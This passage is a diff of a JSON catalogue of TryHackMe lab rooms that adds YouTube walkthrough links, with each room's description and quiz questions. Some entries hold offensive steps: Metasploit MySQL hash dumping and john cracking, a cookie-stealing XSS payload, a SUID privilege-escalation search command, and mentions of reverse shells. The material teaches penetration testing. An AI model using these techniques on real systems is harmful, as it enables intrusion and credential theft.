with SUID- as otherwise bash will sometimes drop the permissions. Great! If all's gone well you should have a shell as root! What's the root flag? What does SMTP stand for? What does SMTP handle the sending of? (answer in plural) What is the first step in the SMTP process? What is the default SMTP port? Where does the SMTP server send the email if the recipient's server is not available? On what server does the Email ultimately end up on? Can a Linux machine run an SMTP server? (Y/N) Can a Windows machine run an SMTP server? (Y/N) First, lets run a port scan against the target machine, same as last time. What port is SMTP running on? Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this? If you would like some more help or practice using Metasploit, TryHackMe has a module on Metasploit that you can check out here: https://tryhackme.com/module/metasploit Let's search for the module \" smtp_version\", what's it's full module name? Great, now- select the module and list the options. How do we do this? Have a look through the options, does everything seem correct? What is the option we need to set? Set that to the correct value for your target machine. Then run the exploit. What's the system mail name? What looks roughly like the end of an E-Mail address? What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research. If I want to send a letter to my friend I have to **** it. Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module \" smtp_enum \", what's it's full module name? We're going to be using the \"top-usernames-shortlist.txt\" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed). Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: \"sudo apt install seclists\" Alternatively, you can download the repository from here . What option do we need to set to the wordlist's path? Once we've set this option, what is the other essential paramater we need to set? Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated! Okay! Now that's finished, what username is returned? What is the password of the user we found during our enumeration stage? Great! Now, let's SSH into the server as the user, what is contents of smtp.txt What type of software is MySQL? What language is MySQL based on? What communication model does MySQL use? What is a common application of MySQL? What major social network uses MySQL as their back-end database? This will require further research. Who was involved in the Cambridge Analytica scandal? As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using? Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command \" mysql -h [IP] -u [username] -p \" Okay, we know that our login credentials work. Lets quit out of this session with \"exit\" and launch up Metasploit. We're going to be using the \"mysql_sql\" module. Search for, select and list the options it needs. What three options do we need to set? (in descending order). Each option name is separated by a / Run the exploit. By default it will test with the \"select version()\" command, what result does this give you? Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the \"sql\" option to \"show databases\". how many databases are returned? First, let's search for and select the \"mysql_schemadump\" module. What's the module's full name? Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped? Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the \"mysql_hashdump\" module. What's the module's full name? Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you? Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called \"hash.txt\". What is the user/hash combination string? Remember to input the whole hash string, like: carl:*(HASHDATA) Now, we need to crack the password! Let's try John the Ripper against it using: \" john hash.txt \" what is the password of the user we found? Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service? What's the contents of MySQL.txt Congratulations! You did it!",
@@ -8113,6 +8467,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/nmap02"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/PMO5Eli8TjE"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/RS0UKJ-Igh8"
       }
     ],
     "skills": "Nmap Basic Port Scans Learn in-depth how nmap TCP connect scan, TCP SYN port scan, and UDP port scan work.",
@@ -8253,6 +8619,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/openvas"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/t6M8ZXyzMmA"
       }
     ],
     "skills": "OpenVAS  Learn the basics of threat and vulnerability management using Open Vulnerability Assessment Scanning",
@@ -8449,6 +8821,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/overpass"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/XtySdRYCbiY"
       }
     ],
     "skills": "Overpass What happens when some broke CompSci students make a password manager? Hack the machine and get the flag in user.txt OWASP Top 10 Vuln! Do NOT bruteforce. Escalate your privileges and get the flag in root.txt",
@@ -8841,6 +9219,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/picklerick"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/1Seh55VsvM4"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/oCAtfcr3iUw"
       }
     ],
     "skills": "Pickle Rick A Rick and Morty CTF. Help turn Rick back into a human! What is the first ingredient that Rick needs? What is the second ingredient in Rick’s potion? What is the last and final ingredient?",
@@ -9009,6 +9399,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/protocolsandservers"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/9nhDshFo87A"
       }
     ],
     "skills": "Protocols and Servers Learn about common protocols such as HTTP, FTP, POP3, SMTP and IMAP, along with related insecurities.",
@@ -9149,6 +9545,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/pyramidofpainax"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/9qjV8NR8QrA"
       }
     ],
     "skills": "Pyramid Of Pain  Learn what the Pyramid of Pain is and how it ranks indicators by how painful they are for an adversary to change.",
@@ -9373,6 +9775,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/redteamengagements"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/ns8ZVbSYTho"
       }
     ],
     "skills": "Red Team Engagements Learn the steps and procedures of a red team engagement, including planning, frameworks, and documentation. Read the above and continue to the next task. Read the example client objectives and answer the questions below. Below is an example of the client objectives of a mature organization with a strong security posture. Example 1 - Global Enterprises: Objectives: Identify system misconfigurations and network weaknesses. Focus on exterior systems. Determine the effectiveness of endpoint detection and response systems. Evaluate overall security posture and response. SIEM and detection measures. Remediation. Segmentation of DMZ and internal servers. Use of white cards is permitted depending on downtime and length. Evaluate the impact of data exposure and exfiltration. Scope: System downtime is not permitted under any circumstances. Any form of DDoS or DoS is prohibited. Use of any harmful malware is prohibited; this includes ransomware and other variations. Exfiltration of PII is prohibited. Use arbitrary exfiltration data. Attacks against systems within 10.0.4.0/22 are permitted. Attacks against systems within 10.0.12.0/22 are prohibited. Bean Enterprises will closely monitor interactions with the DMZ and critical/production systems. Any interaction with \"*.bethechange.xyz\" is prohibited. All interaction with \"*.globalenterprises.thm\" is permitted. What CIDR range is permitted to be attacked? Is the use of white cards permitted? (Y/N) Are you permitted to access \"*.bethechange.xyz?\" (Y/N) Download the sample rules of engagement from the task files. Once downloaded, read the sample document and answer the questions below. How many explicit restriction are specified? What is the first access type mentioned in the document? Is the red team permitted to attack 192.168.1.0/24? (Y/N) Read the above and move on to engagement documentation. Read the above and move on to the upcoming engagement specific tasks. Read the example CONOPS and answer the questions below. Below is an example of the CONOPS for a mature organization with a strong security posture. Example 1 - Holo Enterprises: CONOPS: Holo Enterprises has hired TryHackMe as an external contractor to conduct a month-long network infrastructure assessment and security posture. The campaign will utilize an assumed breach model starting in Tier 3 infrastructure. Operators will progressively conduct reconnaissance and attempt to meet objectives to be determined. If defined goals are not met, the red cell will move and escalate privileges within the network laterally. Operators are also expected to execute and maintain persistence to sustain for a period of three weeks. A trusted agent is expected to intervene if the red cell is identified or burned by the blue cell throughout the entirety of the engagement. The last engagement day is reserved for clean-up and remediation and consultation with the blue and white cell. The customer has requested the following training objectives: assess the blue team's ability to identify and defend against live intrusions and attacks, Identify the risk of an adversary within the internal network. The red cell will accomplish objectives by employing the use of Cobalt Strike as the primary red cell tool. The red cell is permitted to use other standard tooling only identifiable to the targeted threat. Based on customer security posture and maturity, the TTP of the threat group: FIN6, will be employed throughout the engagement. How long will the engagement last? How long is the red cell expected to maintain persistence? What is the primary tool used within the engagement? Navigate to the \" View Site\" button and read the provided resource plan. Once complete, answer the questions below. When will the engagement end? (MM/DD/YYYY) Found under \"Execution Dates\". Format is MM/DD/YYYY. What is the budget the red team has for AWS cloud cost? Found under \"Cloud Requirements\" Are there any miscellaneous requirements for the engagement? (Y/N) Found under \"Misc. Requirements\" Navigate to the \" View Site\" button and read the provided operations plan. Once complete, answer the questions below. What phishing method will be employed during the initial access phase? Found under \"Planned TTPs and Attacks\" What site will be utilized for communication between the client and red cell? Found under \"Communications Plan\" If there is a system outage, the red cell will continue with the engagement. (T/F) Found under \"Halting/Stopping Conditions\" Navigate to the \" View Site\" button and read the provided mission plan. Once complete, answer the questions below. When will the phishing campaign end? (mm/dd/yyyy) Found under \"Engagement Breakdown\" Are you permitted to attack 10.10.6.78? (Y/N) Found under \"Targets\" When a stopping condition is encountered, you should continue working and determine the solution yourself without a team lead. (T/F) Found under \"Execution Variants\" Read the above and continue learning!",
@@ -9401,6 +9809,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/redteamfundamentals"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/K9aT51v7tkA"
       }
     ],
     "skills": "Red Team Fundamentals Learn about the basics of a red engagement, the main components and stakeholders involved, and how red teaming differs from other cyber security engagements. Click to continue to the next task Would vulnerability assessments prepare us to detect a real attacker on our networks? (Yay/Nay) During a penetration test, are you concerned about being detected by the client? (Yay/Nay) Highly organised groups of skilled attackers are nowadays referred to as ... The goals of a red team engagement will often be referred to as flags or... During a red team engagement, common methods used by attackers are emulated against the target. Such methods are usually called TTPs. What does TTP stand for? The main objective of a red team engagement is to detect as many vulnerabilities in as many hosts as possible (Yay/Nay) What cell is responsible for the offensive operations of an engagement? What cell is the trusted agent considered part of? If an adversary deployed Mimikatz on a target machine, where would they be placed in the Lockheed Martin cyber kill chain? What technique's purpose is to exploit the target's system to execute code? Click the \"View Site\" button and follow the example engagement to get the flag Read the above and continue learning!",
@@ -9933,6 +10347,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/skynet"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/HXikLrFVIXc"
       }
     ],
     "skills": "Skynet A vulnerable Terminator themed Linux machine.",
@@ -10129,6 +10549,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/socl1alerttriage"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/DdSjj1p1j5Q"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/S227ZLLXeF4"
       }
     ],
     "skills": "SOC L1 Alert Triage Learn more about SOC alerts and build a systematic approach to efficiently triaging them.",
@@ -10157,6 +10589,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/socmetricsobjectives"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/7acQ1rtY6xA"
       }
     ],
     "skills": "SOC Metrics and Objectives Explore key metrics driving SOC effectiveness and discover ways to improve them.",
@@ -10185,6 +10623,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/socroleinblueteam"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/6wSMqbBdwOQ"
       }
     ],
     "skills": "SOC Role in Blue Team Discover security roles and learn how to advance your SOC career, starting from the L1 analyst.",
@@ -10213,6 +10657,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/socworkbookslookups"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/4dkpb5KthW8"
       }
     ],
     "skills": "SOC Workbooks and Lookups Discover useful corporate resources to help you structure and simplify L1 alert triage.",
@@ -10465,6 +10915,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/steelmountain"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/g5-6zAqbtWI"
       }
     ],
     "skills": "Steel Mountain Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.",
@@ -10577,6 +11033,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/btsysinternalssg"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/pBnHDHSAku8"
       }
     ],
     "skills": "Sysinternals Learn to use the Sysinternals tools to analyze Windows systems or applications.",
@@ -10605,6 +11067,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/systemsattackvectors"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/GOBz5qKBUjY"
       }
     ],
     "skills": "Systems as Attack Vectors Learn how attackers exploit vulnerable and misconfigured systems, and how you can protect them.",
@@ -10689,6 +11157,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/teamcw"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/U9dZV-o2MHY"
       }
     ],
     "skills": "Team Beginner friendly boot2root machine Deployed user.txt As the \"dev\" site is under contruction maybe it has some flaws? \"url?=\" + \"This rooms picture\" root.txt Is root running anything automated? ps I like PATH s",
@@ -10913,6 +11387,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/thelayoftheland"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/FPxxgI6KU_A"
       }
     ],
     "skills": "The Lay of the Land Learn about and get hands-on with common technologies and security products used in corporate environments; both host and network-based security solutions are covered.",
@@ -11361,6 +11841,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/trooper"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/ge1FbqCdAnc"
       }
     ],
     "skills": "Trooper Use Cyber Threat Intelligence knowledge and skills to identify a threat based on a report.",
@@ -11669,6 +12155,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/vulnerabilities101"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/tt3vFjVrP80"
       }
     ],
     "skills": "Vulnerabilities 101 Understand the flaws of an application and apply your researching skills on some vulnerability databases. Read this task! An attacker has been able to upgrade the permissions of their system account from \"user\" to \"administrator\". What type of vulnerability is this? You manage to bypass a login panel using cookies to authenticate. What type of vulnerability is this? What year was the first iteration of CVSS published? If you wanted to assess vulnerability based on the risk it poses to an organisation, what framework would you use? Note: We are looking for the acronym here. If you wanted to use a framework that was free and open-source, what framework would that be? Note: We are looking for the acronym here. Using NVD , how many CVEs were published in July 2021? Change \"Search Type\" to Advanced, specify the proper Published Date Range, and hit Search. Who is the author of Exploit-DB ? What type of vulnerability did we use to find the name and version of the application in this example? Follow along with the showcase of exploiting ACKme's application to the end to retrieve a flag. What is this flag? Continue on your learning with the additional rooms in this module .",
@@ -11781,6 +12273,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/vulnversity"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/hvYWCegfEZs"
       }
     ],
     "skills": "Vulnversity Learn about active recon, web app attacks and privilege escalation. Deploy the machine. There are many Nmap \"cheatsheets\" online that you can use too. Scan the box; how many ports are open? What version of the squid proxy is running on the machine? How many ports will Nmap scan if the flag -p-400 was used? What is the most likely operating system this machine is running? Run nmap with the -O flag What port is the web server running on? It's essential to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open, so constantly scan ports after 1000 (even if you leave checking in the background). What is the flag for enabling verbose mode using Nmap? I have successfully configured Gobuster. What is the directory that has an upload form page? What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out. I understand the Burpsuite tool and its purpose during pentesting . What extension is allowed after running the above exercise? While completing the above exercise, I have successfully downloaded the PHP reverse shell. What is the name of the user who manages the webserver? What is the user flag? The contents of the file /home/bill/user.txt On the system, search for all SUID files. Which file stands out? Use the command: find / -user root -perm -4000 -exec ls -ldb {} \\; What is the root flag value? /bin/systemctl",
@@ -11837,6 +12335,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/walkinganapplication"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/al-N55RkG8s"
       }
     ],
     "skills": "Walking An Application Manually review a web application for security issues using only your browsers developer tools. Hacking with just your browser, no tools or scripts.",
@@ -12061,6 +12565,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/introtoshells"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/caHSSAyO8zY"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/nJLRfcB1LsU"
       }
     ],
     "skills": "What the Shell? An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.",
@@ -12453,6 +12969,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/axss"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/rt0lRmVfH0U"
       }
     ],
     "skills": "XSS Explore in-depth the different types of XSS and their root causes. I completed the Intro to Cross-site Scripting room. Which XSS vulnerability relies on saving the malicious script? Which prevalent XSS vulnerability executes within the browser session without being saved? What does DOM stand for? Based on the leading causes of XSS vulnerabilities, what operations should be performed on the user input? To prevent XSS vulnerabilities, what operations should be performed on the data before it is output to the user? Which one of the following characters do you expect to be encoded? . , , , ; , & , or # ? Which one of the following characters do you expect to be encoded? + , - , * , < , = , or ^ ? Which function can we use in JavaScript to replace (unsafe) special characters with HTML entities? Which function did we use in PHP to replace HTML special characters? What type of vulnerability is it? Use the above exploit against the attached VM. What do you see on the second line after go to ? What is the name of the JavaScript function we used to sanitize the user input before saving it? Which method did we call in ASP.Net C# to sanitize user input? What type of vulnerability is it? Go to the contact page and submit the following message <script>alert(document.cookie)</script> . Next, log in as the Receptionist. What is the name of the key from the displayed key-value pair? DOM-based XSS is reflected via the server. (Yea/Nay) DOM-based XSS happens only on the client side. (Yea/Nay) Which JavaScript method was used to escape the user input? Which character does &#x09 represent? This room used a fictional static site to demonstrate one of the XSS vulnerabilities. Which XSS type was that?",
@@ -12509,6 +13031,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/yara"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/uXpKr-ZGIp4"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/pnHWzXFTYwM"
       }
     ],
     "skills": "Yara Learn the applications and language that is Yara for everything threat intelligence, forensics, and threat hunting!",
@@ -13433,6 +13967,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/forensics"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/hOrc3WTm9Us"
       }
     ],
     "skills": "Forensics  This is a memory dump of compromised system, do some forensics kung-fu to explore the inside.",
@@ -14245,6 +14785,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/ra"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/9Me9-mxj9YU"
       }
     ],
     "skills": "Ra You have found WindCorp's internal network and their Domain Controller. Can you pwn their network?",
@@ -15113,6 +15659,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/zer0logon"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/XSBV8EDHw7w"
       }
     ],
     "skills": "Zero Logon Learn about and exploit the ZeroLogon vulnerability that allows an attacker to go from Zero to Domain Admin without any valid credentials.",
@@ -15841,6 +16393,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/windowsfundamentals1xbx"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/8jq2dn943ko"
       }
     ],
     "skills": "Windows Fundamentals 1 In part 1 of the Windows Fundamentals module, we'll start our journey learning about the Windows desktop, the NTFS file system, UAC, the Control Panel, and more.. What encryption can you enable on Pro that you can't enable in Home? Which selection will hide/disable the Search box? Which selection will hide/disable the Task View button? Besides Clock and Network, what other icon is visible in the Notification Area? Try right-clicking the icon Read above and start the virtual machine. What is the meaning of NTFS? What is the system variable for the Windows folder? What is the name of the other user account? What groups is this user a member of? What built-in account is for guest access to the computer? What is the account description? What does UAC mean? In the Control Panel, change the view to Small icons . What is the last setting in the Control Panel view? What is the keyboard shortcut to open Task Manager? Read above and terminate the Windows machine you deployed in this room.",
@@ -16093,6 +16651,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/0day"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/TS_yfDqr_3s"
       }
     ],
     "skills": "0day Exploit Ubuntu, like a Turtle in a Hurricane user.txt Hint's in the description. root.txt This is a very old operating system you've got here, isn't it?..",
@@ -17577,6 +18141,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/biteme"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/vAlkrw-o7m4"
       }
     ],
     "skills": "biteme Stay out of my server! What is the user flag? What is the root flag?",
@@ -17997,6 +18567,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/ettubrute"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/M6ErWDIVbtU"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/JdSS5WeDy8I"
       }
     ],
     "skills": "Brute You as well, Brutus?",
@@ -18025,6 +18607,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/burpsuiteintruder"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/y4gitvb_WY4"
       }
     ],
     "skills": "Burp Suite: Intruder Learn how to use Intruder to automate requests in Burp Suite.",
@@ -18053,6 +18641,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/bypassinguac"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/gtOBXFSB-f4"
       }
     ],
     "skills": "Bypassing UAC Learn common ways to bypass User Account Control (UAC) in Windows hosts.",
@@ -18837,6 +19431,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/cybercrafted"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/Roprzmc15-o"
       }
     ],
     "skills": "CyberCrafted Pwn this pay-to-win Minecraft server!",
@@ -19229,6 +19829,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/dogcat"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/1dPrzkA2ccY"
       }
     ],
     "skills": "dogcat I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container. What is flag 1? There's more to *view* than just cats and dogs... What is flag 2? What is flag 3? What is flag 4?",
@@ -19733,6 +20339,24 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/fileinc"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/u_uuk7FWWF4"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/O7-qHZFxjgk"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/-H6e67iMBcc"
       }
     ],
     "skills": "File Inclusion This room introduces file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.",
@@ -19957,6 +20581,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/fridayovertime"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/TdCqKNUKfW4"
       }
     ],
     "skills": "Friday Overtime Step into the shoes of a Cyber Threat Intelligence Analyst and put your investigation skills to the test.",
@@ -20769,6 +21399,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/introtoc2"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/B1lrkFqyaac"
       }
     ],
     "skills": "Intro to C2 Master C2 essentials to boost your Red Team skills and streamline your next assessment.",
@@ -20853,6 +21489,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/threatemulationintro"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/K3f_nebUmo8"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/EH19nOkMoOs"
       }
     ],
     "skills": "Intro to Threat Emulation A look into threat emulation practices as a means of cyber security assessment. Let's get into emulation. What can be defined as an intelligence-driven impersonation of real-world attacks? What is the exercise of representing adversary functions through predefined and automated attack patterns? Under TIBER-EU, under which phase would Engagement and Scoping fall? What is the library that provides technical emulation tests based on TTPs? There's a set of 3 software used by FIN6 & FIN7. Can you identify them? Answers are in alphabetical order, separated by a comma. Research about the APTs on ATT&CK. Which factor will be considered when analysing whether to use existing or custom tools during the emulation? The emulation plan component determining which activities are to be conducted is known as the? What is flag one obtained after completing the exercise? What is flag two obtained after completing the exercise? Click the View Site button at the top of the task to launch the static site. What is flag three obtained after completing the exercise? What is flag four obtained after completing the exercise? Power to Threat Emulation.",
@@ -20937,6 +21585,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/idsevasion"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/05U8GcjFsXs"
       }
     ],
     "skills": "Intrusion Detection  Learn cyber evasion techniques and put them to the test against two IDS Deploy the target machine and create an account and log into the system at http://MACHINE_IP:8000, in preparation for future tasks. Make sure that you make note of the access token that is provided to you after registration What IDS detection methodology relies on rule sets? What widely implemented protocol has an adverse effect on the reliability of NIDS? It's in the corner of your browser and starts with a T Experiment by running tools against the target and viewing the resultant alerts. Is there any unexpected activity? Some of the more obscure nmap modes can produce interesting results. What scale is used to measure alert severity in Suricata? (*-*) The scoring system normalises alert severity scales from different IDS. And details on each of the attached IDS is available on the alert breakdown page. How many services is nmap able to fully recognise when the service scan (-sV) is performed? nmap uses fingerprinting to detect and version services, these are not always completely reliable. Nikto, should find an interesting path when the first scan is performed, what is it called? What value is used to toggle denial of service vectors when using scan tuning (-T) in nikto? You can access the full content of the help screen with the (-H) flag Which flags are used to modify the request spacing in nikto? Use commas to separate the flags in your answer. These are all in the evasion category What version of Grafana is the server running? Try and acquire this without running a scan. You might need to view the Grafana login page in full screen What is the ID of the severe CVE that affects this version of Grafana? If you know the version of Grafana that's running on the target server, It should be possible to search a CVE list If this server was publicly available, What site might have information on its services already? How would we search the site \"example.com\" for pdf files, using advanced Google search tags? What is the password of the grafana-admin account? The passwords for the admin accounts used in network services, can be set ahead of time usually, by modifying the primary config file Is it possible to gain direct access to the server now that the grafana-admin password is known? (yay/nay) Password 